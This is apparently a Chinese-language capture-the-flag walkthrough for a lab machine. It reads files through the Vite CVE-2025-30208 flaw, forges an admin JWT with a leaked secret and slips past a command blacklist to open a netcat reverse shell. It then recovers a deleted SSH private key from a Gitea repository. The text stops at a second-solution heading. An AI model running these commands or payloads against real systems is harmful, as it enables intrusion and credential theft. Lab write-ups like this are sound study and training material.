0FBQyxNQUFNLENBQUMsSUFBSTtBQUNmOztBQUVBLEtBQUssQ0FBQyxRQUFRLENBQUMsb0JBQW9CLENBQUMsT0FBTyxDQUFDLENBQUM7QUFDN0MsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsWUFBWSxDQUFDLE9BQU8sQ0FBQzs7QUFFOUQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUM5RCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ3pELENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsQ0FBQztBQUNwRCxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ0o7O0FBRUEsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUMzQixDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUM7QUFDM0IsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQztBQUN2RCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDTCxDQUFDOztBQUVELEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDbkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUNwQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQzFCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUN6QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDbkIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUM7QUFDekIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE9BQU8sQ0FBQyxHQUFHLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQzFELENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ04sQ0FBQyxDQUFDOztBQUVGLEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQzVDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLHdCQUF3QixDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsT0FBTyxDQUFDLENBQUMsYUFBYSxDQUFDLENBQUM7QUFDakUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLHdCQUF3QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsd0JBQXdCLENBQUMsVUFBVSxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDdEYsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxDQUFDLElBQUksQ0FBQztBQUNwQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLENBQUM7QUFDaEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsVUFBVSxDQUFDLE1BQU07QUFDdEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNWLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRUosQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyx3QkFBd0IsQ0FBQyxLQUFLLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFMUQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLFVBQVUsQ0FBQztBQUNuRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQztBQUN0QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQyxJQUFJLENBQUM7QUFDeEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLENBQUM7QUFDcEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsTUFBTTtBQUMxQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDZCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQztBQUNsQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsSUFBSSxDQUFDO0FBQ3BDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQztBQUNoQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsTUFBTTtBQUN0QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ1YsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxLQUFLLENBQUMsR0FBRzs7QUFFakMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsZUFBZSxDQUFDLENBQUMsQ0FBQyxlQUFlLENBQUMsT0FBTyxDQUFDO0FBQ3BELENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQztBQUMxQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsSUFBSSxDQUFDO0FBQ3BDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQztBQUNoQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FBQyxNQUFNO0FBQzNDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDVixDQUFDLENBQUMsQ0FBQyxDQUFDOztBQUVKLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLG9CQUFvQixDQUFDLE9BQU8sQ0FBQzs7QUFFdEQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUNwQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQ2hFLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQ3ZCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNMLENBQUMsQ0FBQzs7QUFFRixHQUFHLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ2hDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLEdBQUcsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDO0FBQ3hELENBQUMsQ0FBQzsifQ==
```

访问`/sign`返回了一串` jwt`，访问`/execute`提示` permission denied`， 访问`/server.js`返回了 `Express.js `后端的源码

##### ` jwt`

看了大佬`WP`说不难猜出是要修改` jwt` 获得权限，再访问 `/execute `执行命令

```shell
#https://jwt.io/
{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}

---
{
  "uid": -1,
  "role": "guest",
  "iat": 1748528762,
  "exp": 1748530562
}
```

先找个[[网页](https://www.bejson.com/jwt/)](https://www.bejson.com/jwt/)解码`jwt`,显示角色是` guest` 

![image-20250529224940177](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png)

需要将这里的` guest` 改为 `admin` 之类，但是目前并没有` secret`审计` server.js` 的源码

![image-20250529225043847](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png)

`secret`是从 `process.env.JWT_SECRET `获取的。也就是 `dotenv`,尝试读取 `.env `文件

![image-20250529225506429](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225506429.png)

并不能读取 `.env `文件，从报错中可以得知项目路径在`/opt/node`下
这里就需要用到 `CVE `了
页面上有 `3` 处提示
服务是使用 `Vite` 运行的
初始化项目时标注了` Vite `的版本

![image-20250529225656145](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png)

底部标注了页面修改的时间

```shell
@20206675 - Last modified 2025-02-26
```



### POC：Vite[CVE-2025-30208]

根据 `Vite` 的 `release note`，这个日期距离 `6.2.0 `版本最近

搜索` Vite 6.2.0`，也可以找到 `CVE-2025-30208`任意文件读取漏洞

相关`POC`[[4m3rr0r/CVE-2025-30208-PoC: CVE-2025-30208 - Vite Arbitrary File Read PoC](https://github.com/4m3rr0r/CVE-2025-30208-PoC)](https://github.com/4m3rr0r/CVE-2025-30208-PoC)

其实也不用`python`脚本，直接`curl`就行了

具体利用就是在url的文件路径后添加`?raw??`或者`?import&raw??`实现绕过

尝试读取`.env`中的`JWT_SECRE`变量

```shell
└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCdcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsVUFBVSxDQUFDLENBQUMsZ0NBQWdDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDIn0=
```

获得`JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'`，同时还有 `COMMAND_FILTER`，是对 `/execute `命令执行的过滤

### 获得`runner`权限

先使用 `secret` 生成新的 `jwt`

![image-20250529231800529](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png)

```shell
#注意# `curl http://$IP:3000/sign`拿的`jwt`存在有效期，过期了需重新请求
#载荷/Payload
{
    "uid": -1,
    "role": "admin",
    "iat": 1748533467,
    "exp": 1748535267
}
JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'
---
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984
#也可以用厨子，菜谱如下
#recipe=JWT_Sign('2942szKG7Ev83aDviugAa6rFpKixZzZz','HS256')
```

带上 `Authorization `头访问，返回值发生变化

```shell
└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/"
{"status":"rejected","data":"this command is unsafe"}
```

在` server.js `中可以发现，命令来自 `req.query.cmd`，在请求中加上参数`` cmd``

```shell
└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/?cmd=id"
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

成功执行了命令
之前看见的命令过滤黑名单是

```shell
└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
```

简单的绕过黑名单关键字加双引号，空格用+

```shell
└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' 'http://192.168.31.25:3000/execute/?cmd=
n""c+192.168.31.126+1234+-e+s""h'

└─# nc -lvp 1234
listening on [any] 1234 ...
id
connect to [192.168.31.126] from devoops [192.168.31.25] 41285
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

##### 出题者预期解

预期解法是构造 `payload`，修改` COMMAND_FILTER `的内容
但不能修改为空，会导致任何命令都不能执行

```shell
function is_safe_command(cmd) {
if (!cmd || typeof cmd !== 'string') {
return false;
}
if (COMMAND_FILTER.length === 0) {
return false;
}
}
```

因为并没有过滤 `sed` 命令，可以尝试这个 `payload`

```shell
#http://192.168.31.25:3000/execute?cmd=sed -i 's/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env
curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg2MDY3MjUsImV4cCI6MTc0ODYwODUyNX0.1aq1jaBqV4JVCg5cpnWqcGlXIryl1ai-XwT0ypKGWGA' http://$IP:3000/execute/?cmd=sed -i 's/COMMAND_FILTER%3D.*/COMMAND_FILTER%3D"a"/' .env

```

执行后没有错误产生

![image-20250530201653052](https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201653052.png)

现在再尝试使用黑名单中的命令，或者直接使用` CVE` 读取 `.env`

```
└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER=\"a\"\n"
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPVxcXCJhXFxcIlxcblwiIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBLE1BQU0sQ0FBQyxPQUFPLENBQUMsQ0FBQyxVQUFVLENBQUMsQ0FBQyxnQ0FBZ0MsQ0FBQyxDQUFDLGVBQWUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDIn0=
```

发现过滤清单已经被修改
现在就可以随意执行命令了，例如反弹` shell`

```shell
nc 192.168.31.126 1234 -e sh
```

![image-20250530201937705](https://raw.githubusercontent.com/pingsag3/pingsag3.github.io/main/images/image-20250530201937705.png)

### `Gitea`服务

查看本地用户

```shell
cat /etc/passwd
runner:x:1000:1000:::/bin/sh
hana:x:1001:100::/home/hana:/bin/sh
gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh
cd /home
ls -artl
total 12
drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
drwxr-xr-x    3 root     root          4096 Apr 21 12:09 .
drwx------    3 hana     users         4096 Apr 21 14:30 hana
```

得到三个用户`runner` `hana` `gitea`,既然有个`gitea`用户，那必然有部署了`gitea`服务

查看端口开放，本地开放`3002`端口

```shell
netstat -nltp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
```

还发现了` 22` 和 `3002` 端口
没有用户密码和私钥，暂时没有办法利用 `22 `端口。先看` 3002` 端口
因为并没有显示进程名，所以使用 `ps `命令看一下本地运行的进程

```shell
#ps aux
 2492 root      0:00 supervise-daemon gitea --start --pidfile /run/gitea.pid --respawn-delay 2 --respawn-max 5 --respawn-period 1800 --capabilities ^cap_net_bind_service --user gitea --env GITEA_WORK_DIR=/var/lib/gitea --chdir /var/lib/gitea --stdout /var/log/gitea/http.log --stderr /var/log/gitea/http.log /usr/bin/gitea -- web --config /etc/gitea/app.ini
```

发现 `Gitea` 服务

##### 解法1

同时，在 `/opt `目录下发现 `gitea `目录

```shell
cd /opt
ls -artl
total 16
drwxr-xr-x   21 root     root          4096 Apr 21 10:29 ..
drwxrwx---    6 root     runner        4096 Apr 21 11:38 node
drwxr-xr-x    4 root     root          4096 Apr 21 13:41 .
drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 gitea
```

任意用户对` /opt/gitea `具有读取权限
可以直接查看 Gitea 的配置文件，找到 Git 仓库的存储路径在 /etc/gitea/app.ini(其实ps就有这个信息)

```shell
#cat /etc/gitea/app.ini
.....

[repository]
ROOT = /opt/gitea/git
SCRIPT_TYPE = sh
```

得到仓库地址为`/opt/gitea/git`

```shell
cd /opt/gitea/git
ls -artl
total 12
drwxr-xr-x    5 gitea    root          4096 Apr 21 13:52 ..
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 hana
pwd
/opt/gitea/git
cd hana
ls -artl
total 12
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 .
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
cd node.git
ls -artl
total 44
drwxr-xr-x    4 gitea    www-data      4096 Apr 21 14:35 refs
drwxr-xr-x    6 gitea    www-data      4096 Apr 21 14:35 hooks
-rw-r--r--    1 gitea    www-data        73 Apr 21 14:35 description
-rw-r--r--    1 gitea    www-data        66 Apr 21 14:35 config
drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:35 branches
-rw-r--r--    1 gitea    www-data        21 Apr 21 14:35 HEAD
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 ..
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 logs
drwxr-xr-x   24 gitea    www-data      4096 Apr 21 14:36 objects
drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:36 info
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 .
```

此处暴露了 2 个信息

并且在`opt/gitea/git`下存在文件夹`hana`，和 `Linux `操作系统用户相对应

发现在`node.git`文件夹下存在`.git`相关目录文件，只不过文件名不是`.git`
同时，靶机内也有` git` 命令可用

```shell
which git
/usr/bin/git
```

将` Git` 目录拷贝到 `/tmp `目录

```shell
mkdir /tmp/repo
pwd
/opt/gitea/git/hana/node.git
cd ..
pwd
/opt/gitea/git/hana
cp -r ./node.git/ /tmp/repo/.git
```

修改文件名，查看`git log`，查看` commit` 日志

```shell
git log
commit 1994a70bbd080c633ac85a339fd85a8635c63893
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

commit 02c0f912f6e5b09616580d960f3e5ee33b06084a
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:34:37 2025 +0800

    init: init commit
pwd
/tmp/repo/.git
```

发现一个删除提交`del: oops!`,查看这个` commit`

```shell
git show 1994a70bbd080c633ac85a339fd85a8635c63893
commit 1994a70bbd080c633ac85a339fd85a8635c63893
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
```

获得` SSH `私钥(注意：私钥每行开头多了个`-`)

##### 解法2

